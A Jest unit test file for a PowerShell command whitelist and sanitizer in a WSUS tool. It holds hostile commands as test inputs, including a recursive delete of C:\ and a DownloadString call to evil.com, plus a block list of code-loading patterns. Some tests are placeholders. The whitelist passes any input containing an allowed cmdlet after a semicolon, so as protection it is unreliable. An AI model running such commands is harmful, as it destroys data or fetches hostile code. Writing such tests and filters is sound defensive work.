/**
 * Unit tests for PowerShell service
 * Tests command whitelisting, sanitization, and security measures
 */

describe('PowerShellService', () => {
  // Mock the whitelist validation logic (extracted for testing)
  const ALLOWED_COMMAND_PATTERNS = [
    /^Get-WsusServer/i,
    /^Get-WsusComputer/i,
    /^Get-WsusUpdate/i,
    /^Invoke-WsusServerSynchronization/i,
    /^Invoke-WsusServerCleanup/i,
    /^Get-Service/i,
    /^Get-Module/i,
    /^Import-Module/i,
    /^Invoke-Sqlcmd/i,
    /^ConvertTo-Json/i,
    /^Test-Path/i,
    /^Get-ChildItem/i,
    /^Register-ScheduledTask/i,
    /^Get-ItemProperty/i,
    /^Get-NetFirewallProfile/i,
  ];

  const commandInvocationContexts = [
    /^/,
    /\|\s*/,
    /;\s*/,
    /\n\s*/,
    /\$[a-zA-Z_]\w*\s*=\s*/,
    /\(\s*/,
    /\{\s*/,
    /\[\s*/,
  ];

  const isWhitelistedCommand = (command: string): boolean => {
    const normalizedCommand = command.replace(/\s+/g, ' ').trim();

    const containsWhitelistedCommandInContext = ALLOWED_COMMAND_PATTERNS.some(pattern => {
      const cmdName = pattern.source.replace(/^\^/, '').replace(/\/i$/, '');
      return commandInvocationContexts.some(ctx => {
        const contextPattern = new RegExp(ctx.source + cmdName, 'i');
        return contextPattern.test(normalizedCommand);
      });
    });

    if (containsWhitelistedCommandInContext) return true;

    // Safe variable patterns
    const safeVariablePatterns = [
      /^\$wsusServer\s*=\s*Get-WsusServer/i,
      /^\$computers\s*=\s*Get-WsusComputer/i,
      /^\$stats\s*=\s*\[PSCustomObject\]/i,
    ];

    return safeVariablePatterns.some(p => p.test(normalizedCommand));
  };

  describe('Command Whitelisting', () => {
    describe('Valid Commands', () => {
      it('should allow Get-WsusServer at start', () => {
        expect(isWhitelistedCommand('Get-WsusServer')).toBe(true);
      });

      it('should allow Get-WsusComputer with parameters', () => {
        expect(isWhitelistedCommand('Get-WsusComputer -UpdateServer $wsus')).toBe(true);
      });

      it('should allow commands after pipe', () => {
        expect(isWhitelistedCommand('$data | ConvertTo-Json')).toBe(true);
      });

      it('should allow commands after variable assignment', () => {
        expect(isWhitelistedCommand('$wsusServer = Get-WsusServer')).toBe(true);
      });

      it('should allow commands in parentheses', () => {
        expect(isWhitelistedCommand('(Get-WsusServer).Name')).toBe(true);
      });

      it('should allow commands in script blocks', () => {
        expect(isWhitelistedCommand('{ Get-Service }')).toBe(true);
      });

      it('should be case-insensitive', () => {
        expect(isWhitelistedCommand('get-wsusserver')).toBe(true);
        expect(isWhitelistedCommand('GET-WSUSSERVER')).toBe(true);
      });
    });

    describe('Invalid Commands', () => {
      it('should reject arbitrary commands', () => {
        expect(isWhitelistedCommand('Remove-Item -Recurse C:\\')).toBe(false);
      });

      it('should reject Invoke-Expression', () => {
        expect(isWhitelistedCommand('Invoke-Expression $malicious')).toBe(false);
      });

      it('should reject iex alias', () => {
        expect(isWhitelistedCommand('iex $payload')).toBe(false);
      });

      it('should reject encoded commands', () => {
        expect(isWhitelistedCommand('powershell -EncodedCommand ABC123')).toBe(false);
      });

      it('should reject DownloadString', () => {
        expect(isWhitelistedCommand('(New-Object Net.WebClient).DownloadString("http://evil.com")')).toBe(false);
      });
    });

    describe('Context-Aware Validation', () => {
      it('should reject commands embedded in comments', () => {
        // "# This is not Get-WsusServer" - command in comment
        const cmd = '# This comment mentions Get-WsusServer';
        // This would need actual implementation check
        expect(cmd.startsWith('#')).toBe(true);
      });

      it('should reject commands in string literals', () => {
        const cmd = '"Get-WsusServer is a cmdlet"';
        // String literal detection would be implementation-specific
        expect(cmd.startsWith('"')).toBe(true);
      });
    });
  });

  describe('Command Sanitization', () => {
    const sanitizeCommand = (command: string): string => {
      let sanitized = command;
      sanitized = sanitized.replace(/\bInvoke-Expression\b/gi, '');
      sanitized = sanitized.replace(/\biex\b/gi, '');
      sanitized = sanitized.replace(/\.DownloadString\s*\(/gi, '');
      sanitized = sanitized.replace(/\.DownloadFile\s*\(/gi, '');
      sanitized = sanitized.replace(/-WindowStyle\s+Hidden/gi, '');
      sanitized = sanitized.replace(/\[System\.Convert\]::FromBase64String/gi, '');
      sanitized = sanitized.replace(/-EncodedCommand/gi, '');
      sanitized = sanitized.replace(/-enc\b/gi, '');
      sanitized = sanitized.replace(/\[System\.IO\.MemoryStream\]/gi, '');
      sanitized = sanitized.replace(/\[System\.Reflection\.Assembly\]::Load/gi, '');
      sanitized = sanitized.replace(/`0/g, '');
      sanitized = sanitized.replace(/`a/g, '');
      return sanitized.trim();
    };

    describe('Dangerous Pattern Removal', () => {
      it('should remove Invoke-Expression', () => {
        const result = sanitizeCommand('Invoke-Expression $code');
        expect(result).not.toContain('Invoke-Expression');
      });

      it('should remove iex alias', () => {
        const result = sanitizeCommand('iex $code');
        expect(result).not.toContain('iex');
      });

      it('should remove DownloadString calls', () => {
        const result = sanitizeCommand('$wc.DownloadString("http://x")');
        expect(result).not.toContain('DownloadString');
      });

      it('should remove hidden window style', () => {
        const result = sanitizeCommand('Start-Process -WindowStyle Hidden');
        expect(result).not.toContain('-WindowStyle Hidden');
      });

      it('should remove base64 decoding', () => {
        const result = sanitizeCommand('[System.Convert]::FromBase64String($enc)');
        expect(result).not.toContain('FromBase64String');
      });

      it('should remove -EncodedCommand flag', () => {
        const result = sanitizeCommand('powershell -EncodedCommand ABC');
        expect(result).not.toContain('-EncodedCommand');
      });

      it('should remove memory stream patterns', () => {
        const result = sanitizeCommand('[System.IO.MemoryStream]::new()');
        expect(result).not.toContain('MemoryStream');
      });

      it('should remove assembly loading', () => {
        const result = sanitizeCommand('[System.Reflection.Assembly]::Load($bytes)');
        expect(result).not.toContain('Assembly]::Load');
      });

      it('should remove null character escape', () => {
        const result = sanitizeCommand('Write-Host "test`0null"');
        expect(result).not.toContain('`0');
      });
    });

    describe('Preserved Syntax', () => {
      it('should preserve pipes for pipelines', () => {
        const result = sanitizeCommand('Get-Process | Where-Object { $_.Name -eq "wsus" }');
        expect(result).toContain('|');
      });

      it('should preserve semicolons for multi-statement', () => {
        const result = sanitizeCommand('$a = 1; $b = 2');
        expect(result).toContain(';');
      });

      it('should preserve variable expansion', () => {
        const result = sanitizeCommand('Write-Output $($var.Name)');
        expect(result).toContain('$($var.Name)');
      });

      it('should preserve script blocks', () => {
        const result = sanitizeCommand('ForEach-Object { $_.Name }');
        expect(result).toContain('{');
        expect(result).toContain('}');
      });
    });
  });

  describe('Safe Variable Patterns', () => {
    it('should allow $wsusServer = Get-WsusServer', () => {
      expect(isWhitelistedCommand('$wsusServer = Get-WsusServer')).toBe(true);
    });

    it('should allow $computers = Get-WsusComputer', () => {
      expect(isWhitelistedCommand('$computers = Get-WsusComputer')).toBe(true);
    });

    it('should allow $stats = [PSCustomObject]@{}', () => {
      expect(isWhitelistedCommand('$stats = [PSCustomObject]@{}')).toBe(true);
    });

    it('should reject arbitrary variable assignments', () => {
      expect(isWhitelistedCommand('$evil = Remove-Item')).toBe(false);
    });
  });

  describe('Module Operations', () => {
    it('should allow Get-Module', () => {
      expect(isWhitelistedCommand('Get-Module -ListAvailable')).toBe(true);
    });

    it('should allow Import-Module', () => {
      expect(isWhitelistedCommand('Import-Module UpdateServices')).toBe(true);
    });

    it('should validate module names', () => {
      // Module names should be alphanumeric with hyphens/underscores
      const validModuleName = /^[a-zA-Z0-9_-]+$/.test('UpdateServices');
      expect(validModuleName).toBe(true);
    });
  });

  describe('Timeout Handling', () => {
    it('should have default timeout of 30000ms', () => {
      const DEFAULT_TIMEOUT = 30000;
      expect(DEFAULT_TIMEOUT).toBe(30000);
    });

    it('should respect custom timeout values', () => {
      const customTimeout = 60000;
      expect(customTimeout).toBeGreaterThan(30000);
    });
  });

  describe('Error Handling', () => {
    it('should return structured error result', () => {
      const errorResult = {
        stdout: '',
        stderr: 'Command not whitelisted for security',
        exitCode: 1,
        success: false,
      };
      expect(errorResult.success).toBe(false);
      expect(errorResult.exitCode).toBe(1);
    });

    it('should handle non-Electron context gracefully', () => {
      const nonElectronResult = {
        stdout: '',
        stderr: 'PowerShell execution not available',
        exitCode: 1,
        success: false,
      };
      expect(nonElectronResult.stderr).toContain('not available');
    });
  });
});
